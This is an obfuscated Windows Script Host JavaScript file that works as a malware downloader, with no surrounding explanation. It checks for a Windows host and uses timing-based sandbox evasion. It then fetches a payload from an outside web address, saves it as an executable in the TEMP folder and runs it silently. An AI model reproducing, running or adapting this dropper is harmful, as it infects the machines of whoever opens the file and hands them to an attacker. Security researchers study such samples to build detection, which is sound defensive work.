var Tb = false;
var yh = "CreateObject";
var b = function tG() {return WScript[yh]("WScript.Shell");}(), lx = 11;
var yX = "MSXML2.XMLHTTP";
var yL = 2123213;
var h = 0;
function Z(t){b["Run"](t, h, h);};
function qh(){return "" + yX;};
function A(k0, OI){h = h * 1; return k0 - OI;};
function M(){return yh;};
/*@cc_on
  @if (@_win32 || @_win64)
    Tb = true;
  @end
@*/
if (Tb)
{
var U = "";
function El(){return 22;};
var L = 0; var P = 0;
function G0()
{
var ri = new this["Date"]();
var Yi = ri["getUTCMilliseconds"]();
WScript["Sleep"](El());
var ri = new this["Date"]();
var Xv = ri["getUTCMilliseconds"]();
WScript["Sleep"](El());
var ri = new this["Date"]();
var mn = ri["getUTCMilliseconds"]();
var L = "ja";
L = A(Xv, Yi);
var P = "ug";
P = A(mn, Xv);
U = "open";
return A(L, P);
}
var tf = false;
var P0 = false;
for (var aN = h; aN < El() * 1; aN++){if (G0() != h){
tf = true; 
P = "31" + 11 * L + P; 
P0 = true; 
break;
}}
function G() {return ((tf == true) && (tf == P0)) ? 1 : h;};
if (tf && G() && P0){
function BM() {return b["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Cj601BLdk.exe";};
 Me = qh();
 L0 = WScript[yh](Me);
 var k = 1;
 while (k){
try {
L0[U]("GET", "http://aztechnologies.co.uk/sdj3oa", false);
L0["send"]();
cc = "Sleep";
for (;;){WScript[cc](El() * 11); if (L0["readystate"] >= 2 * 2) break;};
k = h;
} catch(G1){};
}
function q(Rw) {var Rd = (1, 2, 3, 4, 5, Rw); return Rd;};
WA = WScript[M()]("ADODB.Stream");
Me = WA;
Me[U]();
Me["type"] = q(1);
Me["write"](L0["ResponseBody"]);
WA["position"] = q(h);
Me["Save" + "ToFile"](BM(), 2);
WA["c"+"lose"]();
nd = BM();
Z(nd);
}
}

